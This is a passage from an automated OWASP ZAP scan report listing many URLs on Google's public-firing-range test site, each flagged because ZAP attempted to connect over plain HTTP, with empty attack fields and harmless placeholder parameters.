  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/escape/serverside/escapeHtml/js_quoted_string?q=a`
* URL: https://public-firing-range.appspot.com/escape/serverside/escapeHtml/js_singlequoted_string%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/escape/serverside/escapeHtml/js_singlequoted_string?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/escape/serverside/escapeHtml/js_singlequoted_string?q=a`
* URL: https://public-firing-range.appspot.com/escape/serverside/escapeHtml/js_slashquoted_string%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/escape/serverside/escapeHtml/js_slashquoted_string?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/escape/serverside/escapeHtml/js_slashquoted_string?q=a`
* URL: https://public-firing-range.appspot.com/escape/serverside/escapeHtml/tagname%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/escape/serverside/escapeHtml/tagname?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/escape/serverside/escapeHtml/tagname?q=a`
* URL: https://public-firing-range.appspot.com/escape/serverside/escapeHtml/textarea%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/escape/serverside/escapeHtml/textarea?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/escape/serverside/escapeHtml/textarea?q=a`
* URL: https://public-firing-range.appspot.com/flashinjection
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/flashinjection`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/flashinjection`
* URL: https://public-firing-range.appspot.com/flashinjection/callbackIsEchoedBack%3Fcallback=func
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/flashinjection/callbackIsEchoedBack?callback=func`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/flashinjection/callbackIsEchoedBack?callback=func`
* URL: https://public-firing-range.appspot.com/flashinjection/callbackParameterDoesNothing%3Fcallback=func
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/flashinjection/callbackParameterDoesNothing?callback=func`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/flashinjection/callbackParameterDoesNothing?callback=func`
* URL: https://public-firing-range.appspot.com/flashinjection/index.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/flashinjection/index.html`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/flashinjection/index.html`
* URL: https://public-firing-range.appspot.com/insecurethirdpartyscripts
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/insecurethirdpartyscripts`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/insecurethirdpartyscripts`
* URL: https://public-firing-range.appspot.com/insecurethirdpartyscripts/index.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/insecurethirdpartyscripts/index.html`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/insecurethirdpartyscripts/index.html`
* URL: https://public-firing-range.appspot.com/insecurethirdpartyscripts/third_party_scripts_without_subresource_integrity.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/insecurethirdpartyscripts/third_party_scripts_without_subresource_integrity.html`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/insecurethirdpartyscripts/third_party_scripts_without_subresource_integrity.html`
* URL: https://public-firing-range.appspot.com/insecurethirdpartyscripts/third_party_scripts_without_subresource_integrity_dynamically_added.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/insecurethirdpartyscripts/third_party_scripts_without_subresource_integrity_dynamically_added.html`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/insecurethirdpartyscripts/third_party_scripts_without_subresource_integrity_dynamically_added.html`
* URL: https://public-firing-range.appspot.com/leakedcookie
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/leakedcookie`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/leakedcookie`
* URL: https://public-firing-range.appspot.com/leakedcookie/index.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/leakedcookie/index.html`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/leakedcookie/index.html`
* URL: https://public-firing-range.appspot.com/leakedcookie/leakedcookie
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/leakedcookie/leakedcookie`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/leakedcookie/leakedcookie`
* URL: https://public-firing-range.appspot.com/leakedcookie/leakedcookie.js
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/leakedcookie/leakedcookie.js`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/leakedcookie/leakedcookie.js`
* URL: https://public-firing-range.appspot.com/leakedcookie/leakedinresource
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/leakedcookie/leakedinresource`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/leakedcookie/leakedinresource`
* URL: https://public-firing-range.appspot.com/mixedcontent
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/mixedcontent`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/mixedcontent`
* URL: https://public-firing-range.appspot.com/mixedcontent/index.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/mixedcontent/index.html`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/mixedcontent/index.html`
* URL: https://public-firing-range.appspot.com/redirect
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/redirect`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/redirect`
* URL: https://public-firing-range.appspot.com/redirect/index.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/redirect/index.html`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/redirect/index.html`
* URL: https://public-firing-range.appspot.com/redirect/meta%3Fq=/
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/redirect/meta?q=/`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/redirect/meta?q=/`
* URL: https://public-firing-range.appspot.com/reflected
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reflected`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reflected`
* URL: https://public-firing-range.appspot.com/reflected/contentsniffing/json%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reflected/contentsniffing/json?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reflected/contentsniffing/json?q=a`
* URL: https://public-firing-range.appspot.com/reflected/contentsniffing/plaintext%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reflected/contentsniffing/plaintext?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reflected/contentsniffing/plaintext?q=a`
* URL: https://public-firing-range.appspot.com/reflected/escapedparameter/js_eventhandler_quoted/DOUBLE_QUOTED_ATTRIBUTE%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reflected/escapedparameter/js_eventhandler_quoted/DOUBLE_QUOTED_ATTRIBUTE?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reflected/escapedparameter/js_eventhandler_quoted/DOUBLE_QUOTED_ATTRIBUTE?q=a`
* URL: https://public-firing-range.appspot.com/reflected/escapedparameter/js_eventhandler_singlequoted/SINGLE_QUOTED_ATTRIBUTE%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reflected/escapedparameter/js_eventhandler_singlequoted/SINGLE_QUOTED_ATTRIBUTE?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reflected/escapedparameter/js_eventhandler_singlequoted/SINGLE_QUOTED_ATTRIBUTE?q=a`
* URL: https://public-firing-range.appspot.com/reflected/escapedparameter/js_eventhandler_unquoted/UNQUOTED_ATTRIBUTE%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reflected/escapedparameter/js_eventhandler_unquoted/UNQUOTED_ATTRIBUTE?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reflected/escapedparameter/js_eventhandler_unquoted/UNQUOTED_ATTRIBUTE?q=a`
* URL: https://public-firing-range.appspot.com/reflected/filteredcharsets/attribute_unquoted/DoubleQuoteSinglequote%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reflected/filteredcharsets/attribute_unquoted/DoubleQuoteSinglequote?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reflected/filteredcharsets/attribute_unquoted/DoubleQuoteSinglequote?q=a`
* URL: https://public-firing-range.appspot.com/reflected/filteredcharsets/body/SpaceDoubleQuoteSlashEquals%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reflected/filteredcharsets/body/SpaceDoubleQuoteSlashEquals?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reflected/filteredcharsets/body/SpaceDoubleQuoteSlashEquals?q=a`
* URL: https://public-firing-range.appspot.com/reflected/filteredstrings/body/caseInsensitive/script%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reflected/filteredstrings/body/caseInsensitive/script?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reflected/filteredstrings/body/caseInsensitive/script?q=a`
* URL: https://public-firing-range.appspot.com/reflected/filteredstrings/body/caseSensitive/SCRIPT%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reflected/filteredstrings/body/caseSensitive/SCRIPT?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reflected/filteredstrings/body/caseSensitive/SCRIPT?q=a`
* URL: https://public-firing-range.appspot.com/reflected/filteredstrings/body/caseSensitive/script%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reflected/filteredstrings/body/caseSensitive/script?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reflected/filteredstrings/body/caseSensitive/script?q=a`
* URL: https://public-firing-range.appspot.com/reflected/index.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reflected/index.html`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reflected/index.html`
* URL: https://public-firing-range.appspot.com/reflected/jsoncallback
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reflected/jsoncallback`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reflected/jsoncallback`
* URL: https://public-firing-range.appspot.com/reflected/parameter/attribute_name%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reflected/parameter/attribute_name?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reflected/parameter/attribute_name?q=a`
* URL: https://public-firing-range.appspot.com/reflected/parameter/attribute_quoted%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reflected/parameter/attribute_quoted?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reflected/parameter/attribute_quoted?q=a`
* URL: https://public-firing-range.appspot.com/reflected/parameter/attribute_script%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reflected/parameter/attribute_script?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reflected/parameter/attribute_script?q=a`
* URL: https://public-firing-range.appspot.com/reflected/parameter/attribute_singlequoted%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reflected/parameter/attribute_singlequoted?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reflected/parameter/attribute_singlequoted?q=a`
* URL: https://public-firing-range.appspot.com/reflected/parameter/attribute_unquoted%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reflected/parameter/attribute_unquoted?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reflected/parameter/attribute_unquoted?q=a`
* URL: https://public-firing-range.appspot.com/reflected/parameter/body
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reflected/parameter/body`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reflected/parameter/body`
* URL: https://public-firing-range.appspot.com/reflected/parameter/body%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reflected/parameter/body?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reflected/parameter/body?q=a`
* URL: https://public-firing-range.appspot.com/reflected/parameter/body_comment%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reflected/parameter/body_comment?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reflected/parameter/body_comment?q=a`
* URL: https://public-firing-range.appspot.com/reflected/parameter/css_style%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reflected/parameter/css_style?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reflected/parameter/css_style?q=a`
* URL: https://public-firing-range.appspot.com/reflected/parameter/css_style_font_value%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reflected/parameter/css_style_font_value?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reflected/parameter/css_style_font_value?q=a`
* URL: https://public-firing-range.appspot.com/reflected/parameter/css_style_value%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reflected/parameter/css_style_value?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reflected/parameter/css_style_value?q=a`
* URL: https://public-firing-range.appspot.com/reflected/parameter/form
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reflected/parameter/form`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reflected/parameter/form`
* URL: https://public-firing-range.appspot.com/reflected/parameter/head%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reflected/parameter/head?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reflected/parameter/head?q=a`
* URL: https://public-firing-range.appspot.com/reflected/parameter/iframe_attribute_value%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reflected/parameter/iframe_attribute_value?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reflected/parameter/iframe_attribute_value?q=a`
* URL: https://public-firing-range.appspot.com/reflected/parameter/iframe_srcdoc%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reflected/parameter/iframe_srcdoc?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reflected/parameter/iframe_srcdoc?q=a`
* URL: https://public-firing-range.appspot.com/reflected/parameter/js_assignment%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reflected/parameter/js_assignment?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reflected/parameter/js_assignment?q=a`
* URL: https://public-firing-range.appspot.com/reflected/parameter/js_comment%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reflected/parameter/js_comment?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reflected/parameter/js_comment?q=a`
* URL: https://public-firing-range.appspot.com/reflected/parameter/js_eval%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reflected/parameter/js_eval?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reflected/parameter/js_eval?q=a`
* URL: https://public-firing-range.appspot.com/reflected/parameter/js_quoted_string%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reflected/parameter/js_quoted_string?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reflected/parameter/js_quoted_string?q=a`
* URL: https://public-firing-range.appspot.com/reflected/parameter/js_singlequoted_string%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reflected/parameter/js_singlequoted_string?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reflected/parameter/js_singlequoted_string?q=a`
* URL: https://public-firing-range.appspot.com/reflected/parameter/js_slashquoted_string%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reflected/parameter/js_slashquoted_string?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reflected/parameter/js_slashquoted_string?q=a`
* URL: https://public-firing-range.appspot.com/reflected/parameter/json%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reflected/parameter/json?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reflected/parameter/json?q=a`
* URL: https://public-firing-range.appspot.com/reflected/parameter/noscript%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reflected/parameter/noscript?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reflected/parameter/noscript?q=a`
* URL: https://public-firing-range.appspot.com/reflected/parameter/style_attribute_value%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reflected/parameter/style_attribute_value?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reflected/parameter/style_attribute_value?q=a`
* URL: https://public-firing-range.appspot.com/reflected/parameter/tagname%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reflected/parameter/tagname?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reflected/parameter/tagname?q=a`
* URL: https://public-firing-range.appspot.com/reflected/parameter/textarea%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reflected/parameter/textarea?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reflected/parameter/textarea?q=a`
* URL: https://public-firing-range.appspot.com/reflected/parameter/textarea_attribute_value%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reflected/parameter/textarea_attribute_value?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reflected/parameter/textarea_attribute_value?q=a`
* URL: https://public-firing-range.appspot.com/reflected/parameter/title%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reflected/parameter/title?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reflected/parameter/title?q=a`
* URL: https://public-firing-range.appspot.com/reflected/url/css_import%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reflected/url/css_import?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reflected/url/css_import?q=a`
* URL: https://public-firing-range.appspot.com/reflected/url/href%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reflected/url/href?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reflected/url/href?q=a`
* URL: https://public-firing-range.appspot.com/reflected/url/object_data%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reflected/url/object_data?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reflected/url/object_data?q=a`
* URL: https://public-firing-range.appspot.com/reflected/url/object_param%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reflected/url/object_param?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reflected/url/object_param?q=a`
* URL: https://public-firing-range.appspot.com/reflected/url/script_src%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reflected/url/script_src?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reflected/url/script_src?q=a`
* URL: https://public-firing-range.appspot.com/remoteinclude
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/remoteinclude`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/remoteinclude`
* URL: https://public-firing-range.appspot.com/remoteinclude/index.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/remoteinclude/index.html`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/remoteinclude/index.html`
* URL: https://public-firing-range.appspot.com/remoteinclude/object_hash.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/remoteinclude/object_hash.html`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/remoteinclude/object_hash.html`
* URL: https://public-firing-range.appspot.com/remoteinclude/parameter/object/application_x-shockwave-flash%3Fq=https://google.com
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/remoteinclude/parameter/object/application_x-shockwave-flash?q=https://google.com`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/remoteinclude/parameter/object/application_x-shockwave-flash?q=https://google.com`
* URL: https://public-firing-range.appspot.com/remoteinclude/parameter/object_raw%3Fq=https://google.com
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/remoteinclude/parameter/object_raw?q=https://google.com`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/remoteinclude/parameter/object_raw?q=https://google.com`
* URL: https://public-firing-range.appspot.com/remoteinclude/parameter/script%3Fq=https://google.com
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/remoteinclude/parameter/script?q=https://google.com`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/remoteinclude/parameter/script?q=https://google.com`
* URL: https://public-firing-range.appspot.com/remoteinclude/script_hash.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/remoteinclude/script_hash.html`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/remoteinclude/script_hash.html`
* URL: https://public-firing-range.appspot.com/reverseclickjacking
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reverseclickjacking`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reverseclickjacking`
* URL: https://public-firing-range.appspot.com/reverseclickjacking/
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reverseclickjacking/`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reverseclickjacking/`
* URL: https://public-firing-range.appspot.com/reverseclickjacking/jsonpendpoint%3Fcallback=urc_button.click&q
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reverseclickjacking/jsonpendpoint?callback=urc_button.click&q`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reverseclickjacking/jsonpendpoint?callback=urc_button.click&q`
* URL: https://public-firing-range.appspot.com/reverseclickjacking/multipage/ParameterInFragment/InCallback/WithoutXFO
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reverseclickjacking/multipage/ParameterInFragment/InCallback/WithoutXFO`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reverseclickjacking/multipage/ParameterInFragment/InCallback/WithoutXFO`
* URL: https://public-firing-range.appspot.com/reverseclickjacking/multipage/ParameterInFragment/InCallback/WithXFO
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reverseclickjacking/multipage/ParameterInFragment/InCallback/WithXFO`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reverseclickjacking/multipage/ParameterInFragment/InCallback/WithXFO`
* URL: https://public-firing-range.appspot.com/reverseclickjacking/multipage/ParameterInFragment/OtherParameter/WithoutXFO
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reverseclickjacking/multipage/ParameterInFragment/OtherParameter/WithoutXFO`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reverseclickjacking/multipage/ParameterInFragment/OtherParameter/WithoutXFO`
* URL: https://public-firing-range.appspot.com/reverseclickjacking/multipage/ParameterInFragment/OtherParameter/WithXFO
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reverseclickjacking/multipage/ParameterInFragment/OtherParameter/WithXFO`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reverseclickjacking/multipage/ParameterInFragment/OtherParameter/WithXFO`
* URL: https://public-firing-range.appspot.com/reverseclickjacking/multipage/ParameterInQuery/InCallback/WithoutXFO
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reverseclickjacking/multipage/ParameterInQuery/InCallback/WithoutXFO`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reverseclickjacking/multipage/ParameterInQuery/InCallback/WithoutXFO`
* URL: https://public-firing-range.appspot.com/reverseclickjacking/multipage/ParameterInQuery/InCallback/WithoutXFO/%3Fq=foo
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reverseclickjacking/multipage/ParameterInQuery/InCallback/WithoutXFO/?q=foo`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reverseclickjacking/multipage/ParameterInQuery/InCallback/WithoutXFO/?q=foo`
* URL: https://public-firing-range.appspot.com/reverseclickjacking/multipage/ParameterInQuery/InCallback/WithXFO
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reverseclickjacking/multipage/ParameterInQuery/InCallback/WithXFO`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reverseclickjacking/multipage/ParameterInQuery/InCallback/WithXFO`
* URL: https://public-firing-range.appspot.com/reverseclickjacking/multipage/ParameterInQuery/InCallback/WithXFO/%3Fq=foo
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reverseclickjacking/multipage/ParameterInQuery/InCallback/WithXFO/?q=foo`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reverseclickjacking/multipage/ParameterInQuery/InCallback/WithXFO/?q=foo`
* URL: https://public-firing-range.appspot.com/reverseclickjacking/multipage/ParameterInQuery/OtherParameter/WithoutXFO
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reverseclickjacking/multipage/ParameterInQuery/OtherParameter/WithoutXFO`
